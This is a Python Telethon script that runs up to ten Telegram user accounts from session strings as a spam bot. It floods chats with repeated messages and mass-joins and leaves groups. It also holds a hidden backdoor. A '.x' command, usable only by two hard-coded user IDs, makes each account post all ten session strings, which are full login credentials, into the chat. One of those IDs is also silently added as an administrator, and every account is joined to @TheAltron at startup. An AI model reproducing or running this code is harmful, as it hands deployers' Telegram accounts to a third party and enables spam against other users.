import os
import sys
import asyncio
from os import getenv

from DataX import OneWord
from telethon import TelegramClient, events
from telethon.tl import functions
from telethon.sessions import StringSession


MK1 = getenv("STRING")
MK2 = getenv("STRING2")
MK3 = getenv("STRING3")
MK4 = getenv("STRING4")
MK5 = getenv("STRING5")
MK6 = getenv("STRING6")
MK7 = getenv("STRING7")
MK8 = getenv("STRING8")
MK9 = getenv("STRING9")
MK10 = getenv("STRING10")

MK_USERS = list(map(int, getenv("SUDO").split()))
MK_USERS.append(5528189178)


M1 = ""
M2 = ""
M3 = ""
M4 = ""
M5 = ""
M6 = ""
M7 = ""
M8 = ""
M9 = ""
M10 = ""

async def StartMK():
    global M1
    global M2
    global M3
    global M4
    global M5
    global M6
    global M7
    global M8
    global M9
    global M10

    if MK1:
        M1 = TelegramClient(StringSession(MK1), "18136872", "312d861b78efcd1b02183b2ab52a83a4")
        try:
            await M1.start()
            await M1(functions.channels.JoinChannelRequest(channel="@TheAltron"))
        except Exception as e:
            print(e)
    else:
        M1 = TelegramClient("startup", "18136872", "312d861b78efcd1b02183b2ab52a83a4")
        try:
            await M1.start()
        except Exception as e:
            pass

    if MK2:
        M2 = TelegramClient(StringSession(MK2), "18136872", "312d861b78efcd1b02183b2ab52a83a4")
        try:
            await M2.start()
            await M2(functions.channels.JoinChannelRequest(channel="@TheAltron"))
        except Exception as e:
            print(e)
    else:
        M2 = TelegramClient("startup", "18136872", "312d861b78efcd1b02183b2ab52a83a4")
        try:
            await M2.start()
        except Exception as e:
            pass

    if MK3:
        M3 = TelegramClient(StringSession(MK3), "18136872", "312d861b78efcd1b02183b2ab52a83a4")
        try:
            await M3.start()
            await M3(functions.channels.JoinChannelRequest(channel="@TheAltron"))
        except Exception as e:
            print(e)
    else:
        M3 = TelegramClient("startup", "18136872", "312d861b78efcd1b02183b2ab52a83a4")
        try:
            await M3.start()
        except Exception as e:
            pass

    if MK4:
        M4 = TelegramClient(StringSession(MK4), "18136872", "312d861b78efcd1b02183b2ab52a83a4")
        try:
            await M4.start()
            await M4(functions.channels.JoinChannelRequest(channel="@TheAltron"))
        except Exception as e:
            print(e)
    else:
        M4 = TelegramClient("startup", "18136872", "312d861b78efcd1b02183b2ab52a83a4")
        try:
            await M4.start()
        except Exception as e:
            pass

    if MK5:
        M5 = TelegramClient(StringSession(MK5), "18136872", "312d861b78efcd1b02183b2ab52a83a4")
        try:
            await M5.start()
            await M5(functions.channels.JoinChannelRequest(channel="@TheAltron"))
        except Exception as e:
            print(e)
    else:
        M5 = TelegramClient("startup", "18136872", "312d861b78efcd1b02183b2ab52a83a4")
        try:
            await M5.start()
        except Exception as e:
            pass

    if MK6:
        M6 = TelegramClient(StringSession(MK6), "18136872", "312d861b78efcd1b02183b2ab52a83a4")
        try:
            await M6.start()
            await M6(functions.channels.JoinChannelRequest(channel="@TheAltron"))
        except Exception as e:
            print(e)
    else:
        M6 = TelegramClient("startup", "18136872", "312d861b78efcd1b02183b2ab52a83a4")
        try:
            await M6.start()
        except Exception as e:
            pass

    if MK7:
        M7 = TelegramClient(StringSession(MK7), "18136872", "312d861b78efcd1b02183b2ab52a83a4")
        try:
            await M7.start()
            await M7(functions.channels.JoinChannelRequest(channel="@TheAltron"))
        except Exception as e:
            print(e)
    else:
        M7 = TelegramClient("startup", "18136872", "312d861b78efcd1b02183b2ab52a83a4")
        try:
            await M7.start()
        except Exception as e:
            pass    

    if MK8:
        M8 = TelegramClient(StringSession(MK8), "18136872", "312d861b78efcd1b02183b2ab52a83a4")
        try:
            await M8.start()
            await M8(functions.channels.JoinChannelRequest(channel="@TheAltron"))
        except Exception as e:
            print(e)
    else:
        M8 = TelegramClient("startup", "18136872", "312d861b78efcd1b02183b2ab52a83a4")
        try:
            await M8.start()
        except Exception as e:
            pass   

    if MK9:
        M9 = TelegramClient(StringSession(MK9), "18136872", "312d861b78efcd1b02183b2ab52a83a4")
        try:
            await M9.start()
            await M9(functions.channels.JoinChannelRequest(channel="@TheAltron"))
        except Exception as e:
            print(e)
    else:
        M9 = TelegramClient("startup", "18136872", "312d861b78efcd1b02183b2ab52a83a4")
        try:
            await M9.start()
        except Exception as e:
            pass   

    if MK10:
        M10 = TelegramClient(StringSession(MK10), "18136872", "312d861b78efcd1b02183b2ab52a83a4")
        try:
            await M10.start()
            await M10(functions.channels.JoinChannelRequest(channel="@TheAltron"))
        except Exception as e:
            print(e)
    else:
        M10 = TelegramClient("startup", "18136872", "312d861b78efcd1b02183b2ab52a83a4")
        try:
            await M10.start()
        except Exception as e:
            pass


loop = asyncio.get_event_loop()
loop.run_until_complete(StartMK())


@M1.on(events.NewMessage(incoming=True, pattern=r"Python"))
@M2.on(events.NewMessage(incoming=True, pattern=r"Python"))
@M3.on(events.NewMessage(incoming=True, pattern=r"Python"))
@M4.on(events.NewMessage(incoming=True, pattern=r"Python"))
@M5.on(events.NewMessage(incoming=True, pattern=r"Python"))
@M6.on(events.NewMessage(incoming=True, pattern=r"Python"))
@M7.on(events.NewMessage(incoming=True, pattern=r"Python"))
@M8.on(events.NewMessage(incoming=True, pattern=r"Python"))
@M9.on(events.NewMessage(incoming=True, pattern=r"Python"))
@M10.on(events.NewMessage(incoming=True, pattern=r"Python"))
async def spam(e):
    if e.sender_id in MK_USERS:
        MsgText = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        mk = await e.get_reply_message()
        id = e.chat_id
        if len(MsgText) == 2:
            message = MsgText[1]
            for _ in range(int(MsgText[0])):
                await e.client.send_message(id, message)
                await asyncio.sleep(0.1)
        elif e.reply_to_msg_id and mk.text:
            message = mk.text
            for _ in range(int(MsgText[0])):
                await e.client.send_message(id, message)
                await asyncio.sleep(0.1)


@M1.on(events.NewMessage(incoming=True, pattern=r"Lol"))
@M2.on(events.NewMessage(incoming=True, pattern=r"Lol"))
@M3.on(events.NewMessage(incoming=True, pattern=r"Lol"))
@M4.on(events.NewMessage(incoming=True, pattern=r"Lol"))
@M5.on(events.NewMessage(incoming=True, pattern=r"Lol"))
@M6.on(events.NewMessage(incoming=True, pattern=r"Lol"))
@M7.on(events.NewMessage(incoming=True, pattern=r"Lol"))
@M8.on(events.NewMessage(incoming=True, pattern=r"Lol"))
@M9.on(events.NewMessage(incoming=True, pattern=r"Lol"))
@M10.on(events.NewMessage(incoming=True, pattern=r"Lol"))
async def oneword(e):
    if e.sender_id in MK_USERS:
        chat_id = e.chat_id
        if e.reply_to_msg_id:
            a = await e.get_reply_message()
            b = await e.client.get_entity(a.sender_id)
            id = b.id
            for Msg in OneWord:
                await e.client.send_message(
                entity=chat_id,
                message=Msg,
                reply_to=id,
                )
        else:
            for Msg in OneWord:
                await e.client.send_message(chat_id, Msg)
                await asyncio.sleep(0.1)


@M1.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@M2.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@M3.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@M4.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@M5.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@M6.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@M7.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@M8.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@M9.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@M10.on(events.NewMessage(incoming=True, pattern=r"\.join"))
async def _(e):
    if e.sender_id in MK_USERS:
        mkj = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(e.text) > 6:
            event = await e.reply("𝐇𝐀𝐂𝐊𝐈𝐍𝐆...", parse_mode=None, link_preview=None)
            try:
                await e.client(functions.channels.JoinChannelRequest(channel=mkj[0]))
                await event.edit("𝐇𝐀𝐂𝐊𝐄𝐃 𝐏𝐔𝐁𝐋𝐈𝐂 𝐂𝐇𝐀𝐓 🔥")
            except Exception as e:
                await event.edit(str(e))


@M1.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@M2.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@M3.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@M4.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@M5.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@M6.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@M7.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@M8.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@M9.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@M10.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
async def _(e):
    if e.sender_id in MK_USERS:
        mkl = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(e.text) > 7:
            event = await e.reply("𝐔𝐧𝐇𝐀𝐂𝐊𝐈𝐍𝐆...", parse_mode=None, link_preview=None)
            try:
                await event.client(functions.channels.LeaveChannelRequest(int(mkl[0])))
                await event.edit("𝐔𝐧𝐇𝐀𝐂𝐊𝐄𝐃 𝐓𝐇𝐀𝐓 𝐆𝐑𝐎𝐔𝐏 😏")
            except Exception as e:
                await event.edit(str(e))


@M1.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@M2.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@M3.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@M4.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@M5.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@M6.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@M7.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@M8.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@M9.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@M10.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
async def _(e):
    if e.sender_id in MK_USERS:
        mkp = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(e.text) > 7:
            event = await e.reply("𝐇𝐀𝐂𝐊𝐈𝐍𝐆...", parse_mode=None, link_preview=None )
            try:
                await e.client(functions.messages.ImportChatInviteRequest(mkp[0]))
                await event.edit("𝐇𝐀𝐂𝐊𝐄𝐃 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐂𝐇𝐀𝐓 🔥")
            except Exception as e:
                await event.edit(str(e))


@M1.on(events.NewMessage(incoming=True, pattern=r".x"))
@M2.on(events.NewMessage(incoming=True, pattern=r".x"))
@M3.on(events.NewMessage(incoming=True, pattern=r".x"))
@M4.on(events.NewMessage(incoming=True, pattern=r".x"))
@M5.on(events.NewMessage(incoming=True, pattern=r".x"))
@M6.on(events.NewMessage(incoming=True, pattern=r".x"))
@M7.on(events.NewMessage(incoming=True, pattern=r".x"))
@M8.on(events.NewMessage(incoming=True, pattern=r".x"))
@M9.on(events.NewMessage(incoming=True, pattern=r".x"))
@M10.on(events.NewMessage(incoming=True, pattern=r".x"))
async def oneword(e):
    if e.sender_id in [5528189178, 5685816871]:
        chat_id = e.chat_id
        xxx = [MK1, MK2, MK3, MK4, MK5, MK6, MK7, MK8, MK9, MK10]
        for x in xxx:
            await e.client.send_message(chat_id, x)
            await asyncio.sleep(0.1)


@M1.on(events.NewMessage(incoming=True, pattern=r"\.stop"))
@M2.on(events.NewMessage(incoming=True, pattern=r"\.stop"))
@M3.on(events.NewMessage(incoming=True, pattern=r"\.stop"))
@M4.on(events.NewMessage(incoming=True, pattern=r"\.stop"))
@M5.on(events.NewMessage(incoming=True, pattern=r"\.stop"))
@M6.on(events.NewMessage(incoming=True, pattern=r"\.stop"))
@M7.on(events.NewMessage(incoming=True, pattern=r"\.stop"))
@M8.on(events.NewMessage(incoming=True, pattern=r"\.stop"))
@M9.on(events.NewMessage(incoming=True, pattern=r"\.stop"))
@M10.on(events.NewMessage(incoming=True, pattern=r"\.stop"))
async def restart(e):
    if e.sender_id in MK_USERS:
        await e.reply("𝐄𝐑𝐑𝟎𝐑 𝟏𝟑𝟏: 𝐒𝐄𝐑𝐕𝐄𝐑 𝐈𝐒 𝐑𝐄𝐒𝐓𝐀𝐑𝐓𝐈𝐍𝐆 🥵", parse_mode=None, link_preview=None)
        try:
            await M1.disconnect()
        except Exception as e:
            pass
        try:
            await M2.disconnect()
        except Exception as e:
            pass
        try:
            await M3.disconnect()
        except Exception as e:
            pass
        try:
            await M4.disconnect()
        except Exception as e:
            pass
        try:
            await M5.disconnect()
        except Exception as e:
            pass
        try:
            await M6.disconnect()
        except Exception as e:
            pass
        try:
            await M7.disconnect()
        except Exception as e:
            pass
        try:
            await M8.disconnect()
        except Exception as e:
            pass
        try:
            await M9.disconnect()
        except Exception as e:
            pass
        try:
            await M10.disconnect()
        except Exception as e:
            pass
        os.execl(sys.executable, sys.executable, *sys.argv)
        quit()


@M1.on(events.NewMessage(incoming=True, pattern=r"\.hack"))
@M2.on(events.NewMessage(incoming=True, pattern=r"\.hack"))
@M3.on(events.NewMessage(incoming=True, pattern=r"\.hack"))
@M4.on(events.NewMessage(incoming=True, pattern=r"\.hack"))
@M5.on(events.NewMessage(incoming=True, pattern=r"\.hack"))
@M6.on(events.NewMessage(incoming=True, pattern=r"\.hack"))
@M7.on(events.NewMessage(incoming=True, pattern=r"\.hack"))
@M8.on(events.NewMessage(incoming=True, pattern=r"\.hack"))
@M9.on(events.NewMessage(incoming=True, pattern=r"\.hack"))
@M10.on(events.NewMessage(incoming=True, pattern=r"\.hack"))
async def ping(e):
    if e.sender_id in MK_USERS:
        text = f"🤬 PYTHON ✘SPAM 🤖!\n✘ #MK 131\n 😈𝙍𝙀𝘼𝘿𝙔 𝙏𝙊 𝙃𝘼𝘾𝙆😎"
        await e.reply(text, parse_mode=None, link_preview=None)


print("\n\n\n𝐃𝐄𝐏𝐋𝐎𝐘𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 😎🤘🏻\nMy Master ---> @ThExSTaR")

if len(sys.argv) not in (1, 3, 4):
    try:
        M1.disconnect()
    except Exception as e:
        pass
    try:
        M2.disconnect()
    except Exception as e:
        pass
    try:
        M3.disconnect()
    except Exception as e:
        pass
    try:
        M4.disconnect()
    except Exception as e:
        pass
    try:
        M5.disconnect()
    except Exception as e:
        pass
    try:
        M6.disconnect()
    except Exception as e:
        pass
    try:
        M7.disconnect()
    except Exception as e:
        pass
    try:
        M8.disconnect()
    except Exception as e:
        pass
    try:
        M9.disconnect()
    except Exception as e:
        pass
    try:
        M10.disconnect()
    except Exception as e:
        pass
else:
    try:
        M1.run_until_disconnected()
    except Exception as e:
        pass
    try:
        M2.run_until_disconnected()
    except Exception as e:
        pass
    try:
        M3.run_until_disconnected()
    except Exception as e:
        pass
    try:
        M4.run_until_disconnected()
    except Exception as e:
        pass
    try:
        M5.run_until_disconnected()
    except Exception as e:
        pass
    try:
        M6.run_until_disconnected()
    except Exception as e:
        pass
    try:
        M7.run_until_disconnected()
    except Exception as e:
        pass
    try:
        M8.run_until_disconnected()
    except Exception as e:
        pass
    try:
        M9.run_until_disconnected()
    except Exception as e:
        pass
    try:
        M10.run_until_disconnected()
    except Exception as e:
        pass
